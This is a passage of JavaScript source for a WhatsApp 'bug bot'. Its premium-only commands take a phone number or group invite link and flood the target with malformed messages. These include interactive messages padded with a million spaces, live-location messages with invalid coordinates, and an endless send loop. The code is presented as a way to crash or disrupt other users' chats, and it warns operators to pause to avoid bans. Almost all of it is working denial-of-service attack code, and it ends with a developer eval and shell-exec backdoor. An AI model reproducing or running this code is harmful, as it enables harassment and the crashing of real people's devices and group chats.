if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
await joreply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
  await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-ios': case 'bug-ipong': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'visible': case 'ios-alok': case 'ios-kelli': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug To Group Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-suki': case 'bug-gcbom': case 'bug-gcmawar': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug To Group Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-ewe': case 'bug-coli': case 'bug-gcexploit': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug To Group Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-ganas': case 'bug-entod': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug To Group Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'penghitaman': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1962623836281@g.us`)
joreply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug To Group Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'bgtes': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await ryozingod.sendVideoAsSticker(m.chat, mengkece, force, { packname: '.', author: '𝐋𝐞𝐗𝐜𝐙' })
}
}
break

case 'bugpenis': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `#𝐋𝐞𝐗𝐜𝐙 ☠️`,
    "sequenceNumber": "0",
    "jpegThumbnail": mengkece
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('<✓> Successfully Send Bug to Private Chat Using bugpenis ✅\n\n<!> Pause 2 minutes so that the bot is not banned.')
}
break
//=================================================//
case 'bugpepek': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'plerku': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'bijiloe': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.')
}
break
//=================================================//
case 'lexcok': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexbarbar': case 'lexdangdut': case 'lexganas': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'temble': case 'kursi': case 'lexalok': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexberak': case 'lexcoli': case 'asuu': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'ajimale': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexspam': case 'lexngocok': case 'lexkentut': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'penjas': case 'ipa': case 'ips': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'riper': case 'guru': case 'kepsek': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'null-chace': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await joreply('✅')
}
break
//=================================================//
case '500k': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await joreply('✅')
}
break
//=================================================//
case 'senggol': {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['000000000000000000000000000000000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: fakejpg,
title: `⦃ ••• ⦄ ⦃| . |⦄ ⦃ ••• ⦄`,
body: `⁗ ⋄ mati aja lu suki 😂`,
previewType: "VIDEO",
sourceUrl: `༑ . #𝐋𝐞𝐗𝐜𝐙 ⿻`,
mediaType: 1,
mediaUrl: 'https://www.instagram.com/__ffajrii'
}
},
text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
}, {
quoted: m
})
}
break
//=================================================//
case '300k': {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['00000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: fakejpg,
title: `⦃ ••• ⦄ ⦃| . |⦄ ⦃ ••• ⦄`,
body: `⁗ ⋄ mati aja lu suki 😂`,
previewType: "VIDEO",
sourceUrl: `༑ . #𝐋𝐞𝐗𝐜𝐙 ⿻`,
mediaType: 1,
mediaUrl: 'https://www.instagram.com/__ffajrii'
}
},
text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
}, {
quoted: m
})
}
break
//=================================================//
case 'prikitiw': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877`)
let target = bijipler + '@s.whatsapp.net'
  for (let j = 10; j < q; j++) {
    await ngeloc(target, ryobug)
  }
 await joreply('✅')
}
break
//=================================================//
case '200k': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
//=================================================//
case 'bgtes2': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
//=================================================//

default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return joreply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return joreply(bang)
}
try {
joreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
joreply(String(e))
}
}
//=================================================//
if (budy.startsWith('>')) {
if (!isDeveloper) return joreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await joreply(evaled)
} catch (err) {
await joreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
if (!isDeveloper) return joreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return joreply(`${err}`)
if (stdout) return joreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
ryozingod.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
❌ Eror Ditemukan. Eror Succes Dilaporkan Ke Contributor Bot, Mohon Tunggu Beberapa Waktu Sampai Owner Memperbaiki Eror Tersebut ✅

${util.format(err)}`)
console.log(util.format(err))
}
peki()
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
